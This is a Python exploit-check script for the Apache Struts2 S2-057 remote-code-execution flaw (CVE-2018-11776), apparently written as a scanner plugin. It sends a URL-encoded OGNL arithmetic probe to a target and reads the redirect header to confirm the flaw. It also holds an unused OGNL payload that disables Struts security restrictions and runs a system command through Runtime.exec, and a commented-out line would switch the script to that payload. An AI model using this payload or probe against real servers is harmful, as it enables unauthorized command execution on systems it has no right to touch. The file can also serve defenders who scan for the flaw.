# coding:utf-8
import requests
import urllib
import random
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'S2-057 rce'
		self.cveid='CVE-2018-11776'
		self.vulsystem= 'Struts2'
		self.vulversion = '<= Struts 2.3.34 , Struts 2.5.16'
		self.findtime='2018'
		self.refer= 'https://github.com/Ivan1ee/struts2-057-exp \n https://github.com/jiguangin/CVE-2018-11776/blob/master/s2-057.py'
		self.testisok=True

		self.vulpath=''
		self.randint=random.randint(1,1000)
		self.payload1= urllib.quote("${"+str(self.randint)+"*"+str(self.randint)+"}") # ognl
		self.payload2= urllib.quote("${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}") # ognl
		
		self.headers={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0'}
		self.flag1=302
		self.flag2=str(self.randint*self.randint)
		self.flag3='groups='

	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			pass
		else:
			target='http://'+target

		if target.endswith(('.action')):
			# url=target.replace(target.split('/')[-1],self.payload2+'/'+target.split('/')[-1])
			url=target.replace(target.split('/')[-1],self.payload1+'/'+target.split('/')[-1])
		else:
			url=target+'/'+self.payload1+'/index.action'
		try:
			resp=requests.get(url=url,headers=self.headers,allow_redirects=False,verify=False)
			# if self.flag1 == resp.status_code and self.flag3 in resp.headers.get('Location'):
			if self.flag1 == resp.status_code and self.flag2 in resp.headers.get('Location'):
				returnData='%s is bad.The vuln is S2-057 rce (CVE-2018-11776).Vul url is: %s'%(target,url)
				status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://192.168.3.12:8082/actionChain1.action'
	pocObj=c2Class()
	print(pocObj.c2Func(target))